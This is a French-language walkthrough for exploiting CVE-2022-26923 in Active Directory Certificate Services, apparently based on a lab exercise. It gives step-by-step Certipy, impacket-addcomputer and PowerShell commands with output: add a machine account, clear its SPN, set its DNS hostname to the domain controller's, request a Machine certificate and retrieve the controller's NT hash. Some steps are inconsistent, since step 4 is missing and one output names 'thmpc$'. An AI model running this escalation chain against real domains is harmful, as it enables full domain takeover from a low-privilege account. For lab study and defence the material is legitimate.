# CVE-2022-26923
Permet à n'importe quel utilisateur à faibles privilèges sur le domaine AD d'élever ses privilèges à ceux d'un administrateur de domaine d'entreprise en un seul saut !

## Exploitation de la vulnérabilité 
Nous utiliserons [Certipy](https://github.com/ly4k/Certipy) pour l'exploitation et les étapes a suivre sont les suivantes

1. Compromettre les informations d’identification d’un utilisateur AD à faibles privilèges.

2. Utilisez ces informations d’identification pour inscrire un nouvel hôte sur le domaine.

3. Modifiez l’attribut du nom d’hôte DNS de l’objet AD de l’ordinateur en celui d’un hôte privilégié, tel qu’un contrôleur de domaine.

4. Supprimez le SPN attribué pour contourner le problème de conflit SPN unique.

5. Demandez un certificat de machine en utilisant le modèle par défaut.

6. Effectuez l’authentification Kerberos avec le modèle reçu, désormais en tant que compte de machine privilégié au lieu de notre faux compte de machine.


**Exemple:** DNS a utiliser dans le fichier `/etc/hosts` 

```sh
10.10.17.21 lundc.lunar.eruca.com lundc lunar-LUNDC-CA lunar.eruca.com
```

## Génération de certificats de test
1. Générer un certificat pour notre utilisateur AD à faibles privilèges

```sh
certipy req 'lunar.eruca.com/user:Password1@@lundc.lunar.eruca.com' -ca LUNAR-LUNDC-CA -template User

#[*] Successfully requested certificate
#[*] Got certificate with UPN 'user@lunar.eruca.com'
#[*] Saved certificate and private key to 'user.pfx'
```

Vérifier que ce certificat est valide et peut également être utilisé pour l'authentification Kerberos:

```sh
certipy auth -pfx user.pfx

#[*] Trying to get TGT...
#[*] Got TGT
#[*] Saved credential cache to 'user.ccache'
#[*] Trying to retrieve NT hash for 'user'
#[*] Got NT hash for 'user@lunar.eruca.com': 43460d636f269c709b20049cee36ae7a
```

> Certipy effectue l'authentification avec le certificat et utilise Impacket pour récupérer le hachage NTLM associé à l'UPN spécifié cela prouve au moins que le certificat est valide et peut être utilisé pour l'authentification Kerberos .

2. Ajout d'un ordinateur au domaine

```sh
impacket-addcomputer 'lunar.eruca.com/user:Password1@' -method LDAPS -computer-name 'USERPC' -computer-pass 'Password1@'

#[*] Successfully added machine account USERPC$ with password Password1@.
```

Générer un certificat pour le nouvel ordinateur que nous avons créé.

```sh
certipy req 'lunar.eruca.com/USERPC$:Password1@@lundc.lunar.eruca.com' -ca LUNAR-LUNDC-CA -template Machine

#[*] Successfully requested certificate
#[*] Got certificate with DNS Host Name 'USERPC.lunar.eruca.com'
#[*] Saved certificate and private key to 'userpc.pfx'
```

Nous pouvons à nouveau vérifier que le certificat est valide en utilisant Certipy :

```sh
certipy auth -pfx userpc.pfx

#[*] Trying to get TGT...
#[*] Got TGT
#[*] Saved credential cache to 'userpc.ccache'
#[*] Trying to retrieve NT hash for 'userpc$'
#[*] Got NT hash for 'userpc$@lunar.eruca.com': 43460d636f269c709b20049cee36ae7a
```

Nous pouvons vérifier le hachage NTLM récupéré par rapport au mot de passe que nous avons défini pour le compte de la machine à l'aide d'un [Générateur NTLM](https://codebeautify.org/ntlm-hash-generator)



3. Mise à jour des attributs DNSHostName et SPN

```sh
Get-ADComputer USERPC -properties dnshostname,serviceprincipalname
```

Mettre à jour l'attribut `DNSHostName` avec celui du contrôleur de domaine

```sh
Set-ADComputer USERPC -ServicePrincipalName @{}
# Supprime le SPN actuel :

Set-ADComputer USERPC -DnsHostName LUNDC.lunar.eruca.com
# Mets l'attribut DNS hostname avec celui du contrôleur de domaine

Get-ADComputer USERPC -properties dnshostname,serviceprincipalname
# Juste pour verifier que tout a fonctionner
```

5. Falsification d'un certificat malveillant

Exécutons à nouveau la même commande de Certipy pour demander un nouveau certificat pour notre ordinateur :

```sh
certipy req 'lunar.eruca.com/USERPC$:Password1@@lundc.lunar.eruca.com' -ca LUNAR-LUNDC-CA -template Machine

#[*] Successfully requested certificate
#[*] Got certificate with DNS Host Name 'LUNDC.lunar.eruca.com'
#[*] Saved certificate and private key to 'lundc.pfx'
```

Cette fois, nous avons remarqué quelque chose de différent. Même si nous avons demandé un certificat pour USERPC, nous avons obtenu un certificat pour LUNDC. Vérifions que ce certificat fonctionne et qu'il renverra le hachage NTLM du compte de la machine LUNDC à la place :

```sh
certipy auth -pfx lundc.pfx

#[*] Trying to get TGT...
#[*] Got TGT
#[*] Saved credential cache to 'lundc.ccache'
#[*] Trying to retrieve NT hash for 'lundc$'
#[*] Got NT hash for 'thmpc$@lunar.eruca.com': <Redacted>
```

> Nous avons officiellement le hachage NTLM pour le compte machine de LUNDC et comme LUNDC est un contrôleur de domaine et que nous avons un accès administratif au DC, nous avons entièrement compromis le domaine en un seul saut !